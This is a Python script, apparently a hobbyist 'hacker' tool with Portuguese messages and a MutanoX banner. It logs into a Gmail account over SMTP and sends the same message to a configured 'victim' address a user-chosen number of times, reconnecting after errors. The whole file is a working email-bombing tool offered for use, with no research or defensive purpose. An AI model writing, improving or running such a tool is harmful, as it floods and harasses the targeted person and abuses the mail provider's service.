import os, json, smtplib, time

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_hacker_banner(username):
    clear_screen()
    print("\033[1;32m") # Green color
    print("  _  _ _   _ _ _ _   _ ____  _  _   ")
    print(" | || | | | | | | \ | | __ )| || |  ")
    print(" | || | | | | | |  \| |  _ \| || |_ ")
    print(" |__  | \_/ | | | |\  | |_) |__   _|")
    print("    |_|\___/|_|_|_| \_|____/   |_|  ")
    print("\033[0m") # Reset color
    print(f"\033[1;36m Bem-vindo, {username}! Preparando para a operação...\033[0m\n")
    time.sleep(2)

with open("config.json") as f:
    config = json.load(f)

class SMTP:
    def __init__(self, email, password, victim, message, number):
        self.email = email
        self.password = password
        self.victim = victim
        self.message = message
        self.number = number
        self.server = None

    def connect(self):
        try:
            self.server = smtplib.SMTP("smtp.gmail.com", 587)
            self.server.ehlo()
            self.server.starttls()
            self.server.login(self.email, self.password)
            print("\033[1;32m [✓] Conexão SMTP estabelecida com sucesso.\033[0m")
            return True
        except smtplib.SMTPAuthenticationError:
            print("\033[1;31m\n [!] O e-mail ou a senha estão incorretos.\033[0m")
            print("\033[1;33m [!] Se você usa a verificação em duas etapas, use uma Senha de Aplicativo.\033[0m")
            print("\033[1;33m     (https://myaccount.google.com/apppasswords)\033[0m")
            input("\033[1;37m Pressione Enter para sair...\033[0m")
            return False
        except Exception as e:
            print(f"\033[1;31m\n [!] Erro ao conectar ao servidor SMTP: {e}\033[0m")
            input("\033[1;37m Pressione Enter para sair...\033[0m")
            return False

    def spam(self):
        clear_screen()
        print_hacker_banner("MutanoX")
        if not self.server:
            if not self.connect():
                return

        print(f"\033[1;36m [!] Iniciando a operação de spam para \'{self.victim}\'...\033[0m")
        for i in range(1, self.number + 1):
            try:
                self.server.sendmail(self.email, self.victim, self.message)
                print(f"\033[1;32m [>] Pacote de dados {i} enviado com sucesso para \'{self.victim}\'\033[0m")
            except Exception as e:
                print(f"\033[1;31m [!] Erro ao enviar o pacote de dados {i}: {e}\033[0m")
                print("\033[1;33m [!] Tentando restabelecer conexão com o servidor SMTP...\033[0m")
                if not self.connect():
                    print("\033[1;31m [!] Falha na reconexão. Operação abortada.\033[0m")
                    break
        print("\033[1;36m\n [!] Operação finalizada. Dados transmitidos com sucesso.\033[0m")
        input("\033[1;37m Pressione Enter para continuar...\033[0m")

    def disconnect(self):
        if self.server:
            self.server.quit()
            print("\033[1;32m [✓] Conexão SMTP encerrada.\033[0m")

if __name__ == "__main__":
    print_hacker_banner("MutanoX")
    email = config.get("email")
    password = config.get("password")
    victim = config.get("victim")
    message = config.get("message")

    if not all([email, password, victim, message]):
        print("\033[1;31m\n [!] Erro: As credenciais (e-mail, senha, vítima ou mensagem) estão faltando no config.json.\033[0m")
        input("\033[1;37m Pressione Enter para sair...\033[0m")
    else:
        try:
            number = int(input("\033[1;36m\n [?] Quantos pacotes de dados deseja transmitir? \033[0m"))
            if number <= 0:
                raise ValueError
        except ValueError:
            print("\033[1;31m\n [!] Entrada inválida. Por favor, insira um número inteiro positivo.\033[0m")
            input("\033[1;37m Pressione Enter para sair...\033[0m")
        else:
            spammer = SMTP(email, password, victim, message, number)
            if spammer.connect():
                spammer.spam()
                spammer.disconnect()


